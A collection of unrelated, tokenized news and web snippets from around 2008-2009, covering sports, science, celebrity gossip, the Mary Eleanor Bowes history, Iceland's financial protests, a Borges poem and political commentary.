They lost both of them , but Whisenhunt believes his team profited from the decision .
Coaches and players were n't available to the media Sunday , but Whisenhunt has said he thinks that trip brought his players closer together .
And he believes this team is always better the second time it experiences something .
This will be the second time this season they 've played at Carolina .
They lost to the Panthers 27 - 23 on Oct. 26 .
The Cardinals led 17 - 3 in the third quarter but two turnovers doomed them .
That experience should help them in Charlotte .
The cell protein suppresses pain eight times more effectivelyLONDON : More people suffer from pain than from heart disease , diabetes and cancer combined , but many of the drugs used to relieve suffering are not completely effective or have harmful side effects .
Now researchers at the University of North Carolina at Chapel Hill School of Medicine and the University of Helsinki have discovered a new therapeutic target for pain control , one that appears to be eight times more effective at suppressing pain than morphine .
The scientists pinpointed the identity and role of a particular protein that acts in pain - sensing neurons , or nerve cells , to convert the chemical messengers that cause pain into ones that suppress it .
“ This protein has the potential to be a groundbreaking treatment for pain and has previously not been studied in pain - sensing neurons , ” said lead study author Mark J. Zylka , Ph.D. , assistant professor of cell and molecular physiology at UNC .
The biological basis of pain is complex .
To study the transmission of painful signals throughout the body , many researchers use “ marker ” proteins that label pain - sensing neurons .
One such marker , FRAP ( fluoride - resistant acid phosphatase ) , has been employed for this purpose for nearly 50 years , but the gene that codes for its production was never identified .
Until researchers at UNC found that FRAP is identical to PAP ( prostatic acid phosphatase ) , a protein routinely used to diagnose prostate cancer whose levels increase in the blood of patients with metastatic prostate cancer .
The new protein suppressed pain as effectively as morphine but for longer .
One dose of PAP lasted for up to 3 days , much longer than the 5 hours gained with a single dose of morphine .
AutomotiveAddicts.com had the opportunity to chat with a manager at Lexus and he confirmed the return of the Toyota Supra within the next two years .
He says the new Toyota Supra will be based off of the current Lexus IS .
He said , think of it as a Toyota badged Lexus IS - F that costs just as much as a Lexus .
Also to note was the fact that the new Supra will not have a manual transmission as an option .
An automatic similar to that of the Lexus IS -F will be available .
Wonder if it will have 8 gears like the Lexus ?
This may mean it is slated to be a hybrid vehicle , hmm maybe ?
He could not confirm .
Of course Lexus seem to have put an end to the LF - A supercar project several months ago .
We still continue to see the LF - A supercar being tested on the Nurburgring with a 5.0L 500 hp V10 under the hood .
Speculation is starting to arise about the new Toyota Supra possibly sporting a V10 but it is not logical .
Our Lexus manager says it will be a turbocharged engine ( not a V10 ) .
That is the word from Toyota .
He will be providing us with more information after his next big meeting with officials from Toyota .
He could not say if it will be a hybrid vehicle although that is the direction everyone is headed in .
At one time it was said that a new sports car from Toyota would be a hybrid vehicle from many sources but here it is almost 2009 and NO SUPRA yet !
We suspect that Toyota will be using a turbocharged 6 cylinder engine in the new Supra .
We expect it to be a class above the 370 Z which will end up costing a lot more than a 370Z .
As far as being a hybrid , we will have to keep digging for an answer .
We will provide additional information once we get some more insider conformations straight from the horse ’s mouth .

Mario Paint : How The 16 - bit Wonder Changed Lives
Note from racketboy : I ’d like to thanks our newest contributor , Zen Albatross , for his personal , yet entertaining look into one of the most influential games in his life , Mario Paint .
I ’m guessing he is not the only one that was impacted by this gem from the 16 - bit era , so I hope you all enjoy reading this as much as I did .
Long ago , before the thought of becoming a professional artist had ever entered my addled young brain , I drew Mario .
I drew Mario a lot .
I drew him with crayons .
I drew him with colored markers .
I drew him at times when I was n’t allowed to draw him , such as Story Time in my Kindergarten classroom –
And even late at night , using the hallway light for illumination , quickly feigning unconsciousness whenever my parents came up the stairs .
To me , Mario was an enigma – An endless vortex of creative energy .
You see , I never had an NES growing up .
Crayons and colored markers were all well and good , but with this burning passion to create , what ’s a kid with a hyperactive imagination and an unyielding fascination with video games to do ?
Then , on my 8th birthday , I got a Super Nintendo .
It was a gift beyond gifts .
It was the highlight of my young life .
But accompanying that magical gray box was another gift ; A gift that had far more importance than I originally gave it credit for :
MARIO PAINT .
I remember not being too enthused about the game at first .
After all , at the time I had the seemingly endless adventures of Super Mario World and Zelda 3 to keep me busy .
The gift almost immediately made me think to myself , “ Oh .
So this is suppose to encourage me to keep drawing , right ?
I see what you did there , Mom & Dad . ”
Little did I know that this 5.5 ” cartridge ( and the mouse peripheral that came with it ) would essentially be the foundation of my creative career .
Before Photoshop , before Paint , before I had ever even used a computer , Mario Paint became the very first time where my creativity and my love for video games came together in sweet , 16 - bit harmony .
Right off the bat , let ’s kick it off with one of my favorite features : The Music Composer .
I grew up in a musical family .
My mother has a degree in Music Ed , my father is a professional Trumpet player who also teaches Elementary School Concert Band and my brother plays Alto Sax and just finished his first year at Crane School of Music .
Under my father ’s tutelage , I started playing Trumpet and learning to read music at around the same time that I got my Super Nintendo .
It almost goes without saying , but yes :
The first piece of music I ever wrote was made in Mario Paint .
Here I was – 8 years old , writing music using a video game .
Needless to say , this resulted in a bit of culture shock for my father , who was nevertheless pleased with my musical endeavors .
Looking back from the year 2008 , I think that one of the greatest testaments to the Mario Paint music tool is that , well … people are still using it .
The charming simplicity of the feature was even valued enough to warrant some people remaking it for home computer use as well .
That is not to say I spent all of my time in Mario Paint using the music tool .
In fact , I probably clocked in the most hours using the Stamp Creator .
This would be my very first experience with pixel art .
I simply ca n’t express how elated I was , as a kid , being able to actually create the very same graphics that are used for the console on which I was playing .
Mario Paint took my appreciation for video games to a whole new level by giving me control over the very building blocks of the SNES itself .
Ah , and what a fine time for me to mention just how awesome the strategy guide was :
I just have to say that I do n’t know a single SNES strategy guide that was more comprehensive than this one .
Seriously , they did n’t really NEED to show you the sprite breakdown for all those characters from all of your favorite Nintendo games .
But they did .
There ’s even a whole mess of pages with characters from Street Fighter 2 , which is n’t even a 1st - party Nintendo game .
On top of that , there ’s pages and pages of project ideas , lessons on animation basics , tips on composing music …
They even explain how you can create animated music videos for your favorite songs by hooking up your stereo and two VCR’s :
Unlike some other creativity - based games , Mario Paint did far more than give you a couple templates and leave you on your merry way –
It encouraged you to be creative and make your own unique compositions .
This proactive and encouraging attitude toward creative freedom is something that I find to be , for the most part , severely lacking in the games of today .
So what does the future hold for creativity - based games ?
To be perfectly honest , it ’s hard to imagine Mario Paint making a comeback nowadays .
Especially considering the evolving face of today ’s games industry , where creativity is continually squelched in lieu of mainstream titles that easily generate mass - appeal .
Still , games like LittleBigPlanet and Banjo Kazooie Nuts & Bolts both focus on a strong foundation of user - generated content , giving us hope that perhaps developers are n’t entirely opposed to the idea of putting the tools back into the hands of the consumer .
Now that I think of it , would n’t these kinds of games be perfect for the DS platform ?
As another one of my favorite games always says , ‘YA GOTTA BELIEVE !’
Like many games of its kind , some say that Mario Paint is n’t really a game .
I wo n’t say that this is completely false , but nevertheless , I still maintain that there should always be a place for creativity - centric software within the realm of video games .
Mario
Paint came along at the perfect time and did something for me that I can say of no other game :
It catapulted both my passion for art and my lifelong love for video games —
And if 30 years from now a young kid can play a game on his Playstation 7 , Xbox 1080 or Nintendo VirtualReality Machine that influences him or her to adopt a creative lifestyle , I ’ll be a happy camper .
Fast - forward 15 years to the present day .
I ’m now 23 and a recent graduate SUNY Fredonia ’s Media Arts program .
But before I left , my senior thesis project brought everything full - circle :
So now after a decade and a half , I ’m back to making pixel art .
Even though it ’s not with Mario Paint this time around , everything makes a bit more sense to me .
I ’m now an artist and a gamer , and I realize that all of this might not have happened if it had n’t been for that 16 - bit brick of gray plastic .
A company collecting royalties on behalf of Hollywood studios has illegally demanded payments from kindergartens in Ireland .
The MPLC requested 10 Euros ( $ 14.00 ) per child per annum , so that they can watch DVDs legally .
However , by doing so they breached the 2000 Copyright Act since MPLC failed to register with the Patent Office .
We have recently reported on the situation in the UK where charities and even police forces are threatened with legal action for playing music within earshot of the general public .
Hollywood is no stranger to strict royalty collection activities either , and has stooped to a new low .
The Motion Picture Licensing Company ( MPLC ) , which is charged with collecting royalties for the big studios , recently wrote to 2,500 kindergartens ( or playschools as they are known in Ireland ) , informing them that it is illegal for the kids there to watch DVDs without an appropriate license .
According to The Times , the letter was sent with the knowledge of the Irish Preschool Play Association ( IPPA ) , which represents many schools populated by around 50,000 kids between 3 and 5 years of age .
The IPPA had worked out a deal with the Hollywood representatives , and eventually managed to get the royalties down to 3 euros per child .
Despite the lowered fee , most kindergarten owners were stunned by the request .
Paula Doran , who runs a playschool in Dublin , said that the kids hardly watch any DVDs at the kindergarten .
“ We would rarely show DVDs anyway because it ’s frowned upon — kids get enough TV at home , ” she said .
In fact , the only time the kids are allowed to watch a DVD is when they are pretending to go to the cinema , a learning activity that Hollywood would fully endorse .
Doran said she could n’t understand how the MPLC could be acting legally , and refused to pay .
It turned out that she was absolutely right not to pay .
The MPLC actually failed to register with the Irish Patent Office , and by demanding payments in the way they have , breached the 2000 Copyright Act .
A spokesman from the IPO confirmed that an organization that acts in this manner could be fined or have its staff jailed .
The MPLC belatedly applied for a license to collect the royalties on Friday .
It ’s never too late to learn , or for the kids , never too early to start filling Hollywood ’s pockets .
ABC stalwarts H.G. Nelson ( Greig Pickhaver ) and " Rampaging " Roy Slaven ( John Doyle ) are leaving the national broadcaster for the world of commercial radio .
Triple J announced last night that after 22 years of presenting iconic programs such as This Sporting Life , Festival Of The Boot , Golden Ring Show and coverage of the 2007 federal election , the two would leave the network .
It is believed they are close to a deal with Triple M .
Triple J manager Linda Bracken said in a statement : " They are more than a radio program , they have become their own radio comedy genre .
It 's been a joy and a privilege to work with them .
They will be missed but we wish them all the best . "
Arsenal 's long - running pursuit of Andrei Arshavin appears to be reaching a successful conclusion after the Russian forward reduced his wage demands .
A deal between the London club and Zenit St. Petersburg had stalled after personal terms with Arshavin could not be agreed .
However , sources in Russia now claim the player has agreed to receiving £ 2.5 m - per-year , as opposed to the originally requested £ 3.5 m , freeing up Arsenal to pay Zenit £ 15 m , a figure that should see the transfer go through before the close of the current transfer window .
Speaking today , the Arsenal manager , Arsène Wenger , said a deal was " 91 % " completed but remained cautious on the transfer going through before Monday 's deadline .
The Frenchman also denied a report from Sky Sports News this morning stating that Arsenal had already secured a work permit for Arshavin .
" It 's very difficult to predict what will happen .
In stories like this there can always be late developments even on the last day of the transfer window , " said Wenger .
" Whether we are close or not has little meaning - it does not matter how close you are , what is important is that you agree .
At the moment , we have no agreement with anybody for any transfer .
" We are always confident , we try our best and respect our budget .
If we can find an agreement , we will do it , if we can not we will not overspend what we have planned to do .
We have not applied for a work permit yet for Arshavin or anybody else . "
Even if he does land Arshavin in the coming days , Wenger remains against the transfer window .
" I do not like it , " he said .
" Every press conference is a bore about players who might come in than about the players who play and do something for the club .
" Others get too much importance at a part of the season where it is more important that you rely on people who fight for you than for those who might come in - that can not be a great help for the club at the moment . "
Critics have been quick to write - off Britney Spears whenever her life has threatened to spiral out of control - but this time she 's beaten them to it !
The ink should soon be dry on a £ 10 million publishing deal for the princess of pop to give a no -holds - barred account of her crazy career .
Brit , 27 , has already been signed up by a literary agent and will put pen to paper following her sell - out world tour .
Our source reveals : " There have been numerous unofficial biographies printed about Britney , but she 's never agreed to pen her own tome - until now .
" And some of the stories she 's got are absolute dynamite .
She 's kept diaries so there 's nothing she 'll leave out unless she wants to .
" If the deal goes ahead she will write between three and five books throughout the next decade - it's one of the most lucrative book deals in showbiz history .
" Britney will talk frankly about growing up and how she went off the rails .
It 'll be a gripping read . "
It 's certainly one way for her to turn over a new leaf ...
Britain 's worst husband : How 18th century 's Andrew Robinson Bowes will make your spouse look a saint
Bedraggled and exhausted , her body still bruised from the latest of many beatings , Mary Eleanor Bowes felt the pistol pressing into her temple .
Summoning what little remained of her strength , she whispered a few heartfelt prayers , looked her brute of a husband in the eye and cried in defiance : ‘ Fire ! ’
The gunpowder was damp and failed to ignite , but such was the depth of Mary ’s misery that she would rather have died than return to the bullying husband she had fled months earlier .
All 's fair in love and war : Mary Eleanor Bowes and her husband Andrew Robinson Bowes
Mary was one of the wealthiest women in Britain : an heiress worth £ 1 million ( £ 150 million in today ’s money ) and raised in a life of privilege .
Yet in the late 1700s , no amount of money or status could save her from the man described as Georgian Britain ’s worst husband .
At a time when women had no legal rights and were not even recognised as separate beings in marriage , divorce was taboo .
When a woman married , she surrendered her wealth to her husband .
And such were the legal system and social mores that a man could verbally and physically abuse his wife with
impunity .
For eight years ,
Mary endured just such a humiliating fate at the hands of her second husband , the vicious adulterer Andrew Robinson Stoney - Bowes .
Fearing for her life , she finally managed to escape in February 1785 with the help of four loyal servants , only to be recaptured several months later by her furious husband .
Little wonder , then , that she was prepared to die rather than submit to another day of torture .
Nothings in her early life could have prepared Mary for such a disastrous marriage .
The only daughter of wealthy mine - owner George Bowes and his second wife Mary , the doted - upon child had every luxury money could buy .
Not only that but , unusually for the time , her father encouraged female education and so
Mary was tutored to the highest standard .
She loved poetry and botany , a rare accomplishment for a woman .
When her father died suddenly in 1760 , Mary , then just 11 , became the richest child in Britain .
Though her father ’s will stipulated that any future husband should take the family surname , there was nothing to prevent him also assuming control of Mary ’s wealth .
An early marriage to John Lyon - the 9th Earl of Strathmore - when Mary was 18 produced five children , but was far from happy .
The earl , though a striking looking man , did not share Mary ’s interests and the pair had little in common .
Mary enjoyed several flirtations and threw herself into the social melee .
When the earl died at sea in 1776 , nine years after their wedding , Mary was more relieved than bereft .
A widow with a young family ( third - born son Thomas was the great - great - grandfather of the late Queen Mother , Elizabeth Bowes - Lyon ) , she hoped to make a more fortuitous second match .
Nothing could have been further from the truth .
Pregnant with her lover George Gray ’s child when her husband died , Mary hastily
arranged a marriage before her pregnancy became obvious .
Before she could finalise the union ( though she had taken legal steps to pass on her fortune to her children , instead of her soon - to - be second husband ) , a rival for her affections appeared .
Widowed sea captain Andrew Robinson Stoney - who , unbeknown to Mary , had abused his wealthy first wife , locking her in cupboards and forcing her to subsist on just an egg a day — had ingratiated himself with her circle .
Charming and handsome , he seduced her but failed to convince her to break off her engagement to Gray in favour of him .
So he launched an audacious plan to win her hand .
With shameless cunning , he planted anonymous and derogatory stories about Mary ’s lack of morals in the gossip column of the popular The Morning Post .
Then , in a double - bluff , he challenged the editor of the paper to a duel to defend Mary ’s honour .
When she found Stoney , apparently wounded , bleeding and close to death , Mary was understandably flattered by his devotion .
When he told her his dying wish was to be her husband , she reluctantly agreed , expecting he would be dead within days .
Mary had no idea that Stoney had staged the duel , having bribed the newspaper editor and a doctor , who daubed him with animal blood and declared he was nearly dead .
However , by the time they had taken their wedding vows - with Stoney rallying from his deathbed to invite his family to drink from Mary ’s ample cellar - she may have been beginning to regret her hasty decision .
Yet not even this underhand behaviour could not have prepared Mary for the horrors to come - eight years of a violent marriage during which Stoney endeavoured to make every year of his wife ’s life more miserable than the last .
From the outset , he set rigid curbs on Mary ’s activities and freedom .
He censored her outgoing mail , opened all her correspondence , chose her clothes and dictated whom she could receive as visitors and what conversation they could enjoy .
He banned her mother from the house , along with the scientific friends who shared Mary ’s interest in botany , and ordered the servants to accompany her at all times and report back on her movements .
And then the violence began .
If Mary did anything to annoy her husband , he would punch , kick or slap her , beating her with the hilt of his sword or a silver candlestick .
Though the servants were aware of this abuse , they were in Stoney ’s pay .
He ordered Mary to explain away any bruises and swellings as evidence of her own clumsiness .
When he discovered that she had signed a legal document passing on all her wealth to her children , the violence intensified .
After one particularly ferocious beating , he forced her to sign a paper revoking the earlier document and transferring control of all income and profits from her estate to Stoney during his lifetime .
When her first husband ’s brother , Thomas Lyon , heard of these changes , he feared Stoney would try to take charge of the children ’s lives as well as their fortunes .
He successfully appealed to the courts to have the children removed from their mother ’s care .
It was a bitter blow for Mary , already suffering from her husband ’s brutality and flagrant affairs , which not even the birth of her illegitimate daughter , also called Mary ( and passed off by Stoney as his own ) , could soften .
Subdued and submissive , she began to believe the beatings were her own fault .
Her plump face became gaunt , her fine clothes shabby and she lost her appetite and sparkle .
Cruelly , Stoney insisted that Mary be curt and often downright rude in company , to perpetuate a myth he had circulated that she was a truculent wife .
Behind closed doors , the opposite was true .
By then drinking heavily , Stoney ’s brutality intensified .
In 1778 , Mary wrote : ‘ He beat me several times , particularly once with a thick stick , the head of which was heavy with lead , and with the handle of a horsewhip . ’
Living in fear of the violence , Mary knew there was little she could do in her defence .
Not only was marital violence common and tolerated , it was supported by law .
A legal manual published in 1736 permitted husbands to beat their wives lawfully to ‘ keep them to their duties ’ .
Mary ’s predicament soon became even worse .
When she fell pregnant with Stoney ’s child , he continued to beat her and denied her the food she craved .
When their son , William , was born , the abuse intensified .
Stoney bedded and impregnated the wet nurse - once even sleeping with her in the same bedroom as his wife .
Mary would later write of the time that Stoney ‘used me with more cruelty and indignity than ever ’ .
At one point he beat her so viciously around the eyes that ‘ the whole room appeared in a blaze ’ .
On another she was left temporarily deaf by blows to the head .
As the assaults increased - often with the use of a knife - Mary discovered that Stoney had taken out a slew of life insurance policies on her .
Refused money for clothes , shoes and undergarments , Mary ’s dishevelled appearance began to resemble that of the lowliest servant - but it was to prove her salvation .
When a new maid arrived at the couple ’s London home on Grosvenor Square - appointed by the family chaplain and not Stoney , who usually employed prostitutes as servants - Mary found an ally .
Educated , devoutly religious and with a strong sense of propriety , Mary Morgan was appalled by the abuse she witnessed .
Though understandably fearful for her own safety , she agreed to help Mary escape , and enlisted the help of three women servants .
On the evening of Thursday , February 3 , 1785 , Stoney left their Grosvenor Square home to dine with a relation - and Mary instigated her daring plan .
While Mary Morgan and a fellow maid feigned a quarrel to distract the guards , the lady of the house rushed below stairs , covered her tattered gown with a servant ’s cloak and tucked her hair under a maid ’s bonnet before scurrying into the night .
The richest heiress in Britain made her way through the foggy streets to hail a hackney carriage .
Stoney , who had been alerted to her escape , unwittingly hurtled past in another coach , his head hanging out of the window as he scoured the streets for his wife .
When she reached her hideaway in the City , Mary was joined by the four servants who had helped her .
She immediately launched legal proceedings to divorce Stoney - citing cruelty and barbarity , and producing witnesses , as the law demanded - and reclaim all her children .
Relying on handouts from friends and servants ( Stoney controlled her fortune and had custody of her two youngest children ) , Mary set about reclaiming her inheritance , with the help of a former footman who had retained a copy of the deed in which she had signed over the money to her children .
For a few months , using an assumed name , Mary enjoyed freedom at her hideaway , until one fateful day when Stoney intercepted a food parcel from one of her farmer tenants and learned of her address .
Realising his only hope of maintaining Mary ’s fortune was to persuade her to return to him , he hired a group of hoodlums to kidnap her in broad daylight .
They fled to the North , with the police and Mary ’s supporters in hot pursuit .
For ten days of unimaginable hardship , Stoney and his cohorts tried to persuade Mary to surrender her body and mind .
She was gagged and beaten , threatened with rape , starved and forced to ride bareback and barely clothed across the Pennines during the coldest winter of the century .
Finally , the prisoner and her captor were spotted by a ploughman and Mary was freed .
Stoney was found guilty of assault and jailed for three years .
Mary had been so weakened by her ordeal that she could not stand for a month or walk across a room for six weeks .
When her strength began to return , she continued divorce proceedings .
It would take four years - due in part to Stoney ’s cunning and prevarication - before she divorced him on the grounds of cruelty .
Even from his cell , Stoney waged a dirty war against his estranged wife , accusing her of infidelity and bad behaviour , as he fought to hang on to her fortune and her two youngest children .
Finally , the deed in which Mary had signed over her wealth to her husband was overturned .
Her fortune and beloved children were returned to her , and Stoney was imprisoned for life .
The various trials were reported in detail by the Press and Mary ’s name was sullied .
It was only the sheer volume of witnesses attesting to Stoney ’s ill treatment which eventually saw her win a landmark case .
Indeed , one judge described her as ‘ the most persecuted woman that ever was ’ .
Mary spent the remainder of her life living quietly in the country , where her obsession with animals ( she insisted her cook prepare hot meals for them ) meant she was regarded as an eccentric .
She never remarried , her reputation and social standing having been damaged permanently by Stoney ’s libellous slanders .
When her loyal maid Mary Morgan died in 1796 , Mary was bereft .
She followed her to the grave in 1800 .
Buried by her own demand in the dress she had worn to marry the Earl of Strathmore , she was laid to rest in Poets ’ Corner , Westminster Abbey .
Born into wealth , blessed with the best education of the day and encouraged by a progressive father , Mary could have achieved greatness as a writer , linguist or botanist , had not her ambitions been stifled by her first husband and strangled by the next .
Instead , she achieved something of much more significance and farreaching importance .
By pitting her wits against one of history ’s vilest husbands and the legal and religious establishment - at a time when women enjoyed little protection - she won an historic divorce case which would stand as a beacon of hope to inspire campaigners in the battle for women ’s rights .

Raw Story
Former analyst at the National Security Agency , Russell Tice , exclusively reveals to Countdown ’s Keith Olbermann that American journalists where specifically targeted by the Bush administration for surveillance .
Tice feared revealing this information while George Bush occupied the Oval office .
Do you think journalists and news organizations KNEW they were being targeted by the illegal wiretapping 24/7 , 365 days a year ?
Did that have an effect on their reporting ?
Was the purpose to intimidate ?
To control ?
To manage the message ?
( “ 1984 “ .. )
What other groups ?
Members of Congress ?
The Senate ?
The Department of Justice ?
Where the fuck did they stop ?
Was illegal wiretapping on ALL Americans just unethical ?
Or was it ILLEGAL ??
This should scare the holy shit out of every single American .
These are not the practices of the America I know and love .
This secret practice has no place in a democracy — by the people , for the people .
Is it still ongoing ?
Or will it stop with President Obama ?
Will he take measures to make sure it cannot happen again ?
Does that mean those breaking the laws by allowing this practice will be held to account ?
Again , I am SO happy and grateful Bush / Cheney are finally GONE !!
Now , we must be diligent , and make sure this practice ends .
This is n’t about ‘ protecting ’ the American people , it never has been .
This was ONLY about controlling the American people .
The word ‘ protecting ’ was certainly thrown around a lot , but that was only used to instill fear , to make people think about being afraid and feel insecure , and then look to the government to ‘ keep them safe ’ .
As I read in a book this last weekend – this line : “ all encompassing terror is an absolute necessity in order to keep a dictatorship in power ” .
That line seriously resonated after the last eight years ..
It may not have technically been a ‘ dictatorship ’ , but it sure felt like it was shaping up to be one .
Thank God it is FINALLY over .

Baruch Spinoza
by Jorge Luis Borges
A haze of gold , the Occident lights up
The window .
Now , the assiduous manuscript
Is waiting , weighed down with the infinite .
Someone is building God in a dark cup .
A man engenders God .
He is a Jew .
With saddened eyes and lemon - colored skin ;
Time carries him the way a leaf , dropped in
A river , is borne off by waters to
Its end .
No matter .
The magician moved
Carves out his God with fine geometry ;
From his disease , from nothing , he 's begun
To construct God , using the word .
No one
Is granted such prodigious love as he :
The love that has no hope of being loved .

While Barack Obama was being sworn in to office on Capitol Hill yesterday , the people of Iceland were starting the first revolution in the history of the republic .
The word " revolution " might sound a bit of an overstatement , but given the calm temperament that usually prevails in Icelandic politics , the unfolding events represent , at the very least , a revolution in political activism .
Four months after the collapse of Iceland 's entire financial system , no one has accepted any responsibility .
Our currency has lost more than half its value , rampant inflation has already eaten up most people 's savings , property values have dropped by more than a third and unemployment is reaching levels never seen before in the life of our young republic .
The fault is clearly shared between the business elite and the government , which failed to regulate the newly privatised financial sector , allowing a few incompetent and egotistical business tycoons to gamble with the nation 's fortune .
And yet neither the government nor the bankers – who , by the way , seem to have disappeared into the cold thin air – see anything wrong with their own behaviour .
The governor of the central bank blames the risk - seeking bankers , the bankers blame the government and the prime minister attributes the whole crisis to the international credit crunch .
This lack of any sense of responsibility has angered the Icelandic public to the extent that they have turned to the streets in greater numbers than ever before .
It started in October with peaceful demonstrations .
Then the frustration grew , first with the lack of any sense of responsibility , then with the lack of any effective action to ease the economic pain most people feel – and finally with the sense that all the political elite were incompetent .
Initially the government tried to dismiss the protesters as frustrated wannabe politicians and disillusioned youngsters who did not understand the complexity of the situation .
But when our grandmothers put down their knitting gear , strapped their boots on and took to the streets shouting for new elections we all saw that the disgust was almost universal .
Yesterday parliament resumed for the first time after Christmas .
Without much organisation or central planning the public surrounded the parliament building and put forward a clear demand for early election .
Ignoring them , the ministers and parliamentarians tried to sit out the protest , hiding inside the old building in downtown Reykjavik .
This time it did n't work .
The protests grew and ordinary people kept warm by burning torches in front of the building .
They were going nowhere .
Well into this dark night in Iceland 's history , parliament remained under siege , and the vigil resumed this morning .
It is the first time in Icelandic history that a young anarchist can well expect to meet his grandmother in the crowd demonstrating against the government and drumming with her kitchen knife on pots and pans .
The government is surely hanging by a thin thread and might fall at any moment .
The Icelandic public fear that their country has virtually been stolen by the globetrotting business elite that spent more time rubbing shoulders with international high society than giving back to the society that enabled them to enjoy this privileged lifestyle .
Now ordinary Icelanders are determined to take their country back .

Market / Octavia Bike Lane Will Stay for Now
In a ruling cheered by bicycle advocates , San Francisco Superior Court Judge Peter J. Busch today rejected the MTA ’s request to modify the bike injunction to allow the removal of the eastbound Market Street bike lane and concrete island at Octavia Boulevard , the city ’s most dangerous intersection for bicyclists .
" The question that confronts me in dealing with all this is in a few months , presumably , the city is going to have its bike plan done and presumably at that point the city is then going to do what it wants as a city otherwise can , " said Busch .
The San Francisco Bicycle Coalition along with many bicyclists , elected officials and others have argued that removing the bike lane and merging bicycle and car traffic would worsen conditions for bicyclists .
The MTA says at least 15 crashes have been reported at the intersection in the last three years between cyclists and drivers making illegal right turns onto Highway 101 .
Busch also denied requests to add improvements to the bicycle route on Third Street and to install bike racks at Church and Market Streets and Dolores and Guerrero at 18th .
He did , however , allow the MTA to go ahead and add sharrows and other improved markings and signage to Folsom , Market , Valencia and Polk Streets .
Attorney Audrey Pearson , representing the city attorney ’s office , argued that immediate changes were needed at Market and Octavia .
" People are still illegally turning right .
I would admit that number has gone down significantly since we put in the traffic island but it ’s obviously not zero otherwise we would n’t be here , " said Pearson .
But in rejecting the motion , Busch said : " I do n’t think an adequate case has been made that there ’s a public safety crisis . "
" I think the injunction has to mean something .
It has to be an effective control on the city ’s desire , which led to the injunction , to break out pieces of an overall bike plan .
I think it is important and appropriate to go through with the entire EIR project for the later bike plan , to have that done . "
Pearson countered that she was n’t confident the injunction would be lifted after the EIR was certified because she expects the plaintiff ’s attorney , Mary Miles , to challenge it .
" It would be presumptuous of the city to assume that the court ’s going to lift the injunction as soon as the EIR is certified .
If the court wants to give me that assurance that would be great , but I just do n’t see that .
So we do have urgent , safety matters here .
These are safety issues .
These are not just let ’s put some bike lanes on the street . "
Outside the courtroom , Leah Shahum , SFBC ’s executive director , said she was relieved by the Market / Octavia decision .
" I think the judge made a wise decision .
I think he pointed out some very fair points that the city did not make a strong case and did not show evidence that their proposal would make the intersection safer . "
Shahum said she felt the judge understood the " city ’s hands have been tied for too long on safety improvements citywide " and vowed to hold the city to its time line of certifying the EIR by spring .
In a separate decision , Busch denied a motion by Miles to hold the city in contempt over her contention it needed to amend the General Plan to reflect language that existed before the bike plan was adopted .
Busch seemed increasingly irritated with Miles and had to repeatedly ask her not to talk over him .

This country puts too many people behind bars for too long .
Most elected officials , afraid of being tarred as soft on crime , ignore these problems .
Sen. Jim Webb , a Democrat of Virginia , is now courageously stepping into the void , calling for a national commission to re-assess criminal justice policy .
Other members of Congress should show the same courage and rally to the cause .
The United States has the world ’s highest reported incarceration rate .
Although it has less than 5 percent of the world ’s population , it has almost one - quarter of the world ’s prisoners .
And for the first time in history , more than 1 in 100 American adults are behind bars .
Many inmates are serving long sentences for nonviolent crimes , including minor drug offenses .
It also is extraordinarily expensive .
Billions of dollars now being spent on prisons each year could be used in far more socially productive ways .
Senator Webb  a former Marine and secretary of the Navy in the Reagan administration  is in many ways an unlikely person to champion criminal justice reform .
But his background makes him an especially effective advocate for a cause that has often been associated with liberals and academics .
More evidence that the Wasilla whack - job was getting pretty Barbra by the end of the campaign .
The McCain camp spent over $ 100,000 on make - up and styling for Palin in the last two months of the campaign , and there 's another $ 30,000 in clothing allowance has yet been spelled out .
When you put it all together , we 're talking about a woman who , if this carried on , would have an annual budget of something close to a $ 1 million for clothes and make - up alone .
Some hockey mom .
No wonder this beauty pageant contestant who once claimed she smelled of fish and longed to meet Ivana Trump , does n't want to leave the stage ( or go back to Alaska which she pretends to govern ) .

Not only will the fuel be cheap , but the exhaust will also produce the wonderful aroma of coffee .
Scientists at the University of Nevada , Reno , researching the prospect of extracting oil from used coffee grounds report that the process is not that difficult .
The cheap and environmentally friendly biofuel is abundant enough to potentially manufacture several hundred million gallons a year to power cars and trucks .
The idea was formed by accident says the chief researcher .
“ I had left my coffee out one night , and the next morning , I noticed that there was a kind of oil around the edge of the cup , ” Mano Misra , a professor of engineering said .
“ Every cup of coffee has it .
I decided to do some tests on the oil . ”
The analysis proved that the grounds contained roughly 10 to 15 percent oil by weight .
The researchers then extracted the oil with standard chemistry techniques and converted it to biodiesel .
For the study , the team collected leftover grounds of espressos , cappuccinos and other coffee preparations from the Starbucks coffee chain .
Being that the process is not particularly energy intensive , the researchers estimated that biodiesel could be produced for about a dollar a gallon .
According to the Department of Agriculture , the world ’s coffee production is more than 7.2 million tons per year .
The study was first reported toward the end of last year in The Journal of Agricultural and Food Chemistry .
The resulting coffee - based fuel – which smells like java– is more stable than traditional biodiesel due to coffee ’s high antioxidant content , according to the researchers .
“ We have found that biodiesel created from spent coffee grounds is stable over a longer period of time than other forms of biodiesel that have been created from feed stocks such as soy and corn , ” Misra said .
“ Biodiesel from spent coffee grounds is a low - cost ‘ green ’ form of fuel that shows a significant reduction of carbon dioxide emission .
It ’s an excellent source for biodiesel . ”
One hurdle , Dr. Misra said , is in the organized collection of the spent beans .
Therefore , the researchers plan on setting up a pilot operation this year using waste from a local bulk roaster .
It wo n’t be a complete fix for reducing America ’s dependence on oil , but it can be a help while at the same time providing a nice aroma for those in the vicinity .
The researchers report that the exhaust actually smells like coffee .
“ It wo n’t solve the world ’s energy problem , ” Dr. Misra said of his work .
“ But our objective is to take waste material and convert it to fuel . ”

I love the beginning of a new year , full of hope and promise and the idea that the slate has been wiped clean and a new start can be achieved .
All over the world as the clock strikes midnight and amidst the streamers and celebrations , millions make resolutions to change in the New Year .
The more popular ones include losing weight and saving money .
Many of you may have already broken or forgotten yours .
Recently Mind , a British mental health charity , suggested that the process of making New Year ’s resolutions can be unhealthy as we focus on the negative aspects of ourselves .
I do not agree .
I think we can only improve ourselves as human beings if we recognize areas of our lives that need correcting or revamping .
Without a continued process of renewal and re-evaluation , how will we know how far we are in reaching our goals and what changes need to made ?
Only when impossible targets are set such as losing 50 pounds in one month will there be an element of frustration which leads to failure .
Constant checks and balances ensure that we remain on the right path or are able recognize the wrong direction and correct it .
In 1998 , Miller and Marlatt from the University of Washington ’s Addictive Behaviors Research Center conducted a study of over 260 subjects to determine what makes a person more likely to fulfill their decisions .
They found that persons who constantly reviewed their progress and found ways to resolve set - backs were more likely to attain their goals .
